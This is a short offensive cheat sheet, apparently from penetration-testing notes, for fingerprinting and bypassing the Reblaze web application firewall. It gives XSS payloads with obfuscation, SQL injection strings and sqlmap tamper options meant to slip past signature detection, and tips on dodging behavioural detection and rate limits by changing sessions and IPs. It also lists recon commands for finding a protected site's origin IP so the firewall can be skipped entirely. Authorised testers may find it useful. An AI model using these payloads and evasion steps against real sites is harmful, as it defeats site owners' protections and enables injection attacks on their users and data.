# Reblaze

### Detection Signals
| Signal | Where |
|--------|-------|
| `rbzid=` cookie | Reblaze session tracking |
| `Server: Reblaze Secure Web Gateway` | Server header |
| Block page: "Access Denied (403)" with Reblaze branding | Response body |
| Block page: "Current session has been terminated" | Response body |
| `rbz*` cookie prefix | Various tracking cookies |

### Bypass Strategy
- **Recommended tool**: Playwright then Burp. Reblaze uses behavioral analysis + signatures.
- **Key insight**: Reblaze is cloud proxy (like Cloudflare). Origin IP discovery = full bypass.
- **Behavioral**: Reblaze tracks mouse movements, click patterns → Playwright (headless: false) recommended.
- **API endpoints**: May have different rule set than web pages.

### XSS Bypass
```
# Reblaze: signature + behavioral detection
# If origin IP found → bypass entirely
# Otherwise:
<svg/onload=alert`1`>
<details open ontoggle=confirm(1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>

# Template literal (in JS context):
${alert(1)}
`${alert(1)}`
```

### SQLi Bypass
```
sqlmap --tamper=charencode,between,space2comment -u URL

# Manual:
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' %55NION %53ELECT 1,2,3--
'%0aOR%0a1=1--%0a
```

### Rate Limiting
- Cloud-based. Behavioral detection tracks request patterns.
- Blocks after sustained automated traffic (~20-50 rapid requests).
- Recovery: new session + IP change.

### Origin IP Discovery
```bash
# Reblaze is DNS proxy — same approach as Cloudflare/Sucuri:
subfinder -d TARGET -silent | httpx -sc | grep -v "reblaze\|rbz"
uncover -q "ssl.cert.subject.CN:TARGET" -e shodan,censys
dnsx -d TARGET -resp -mx
```

---

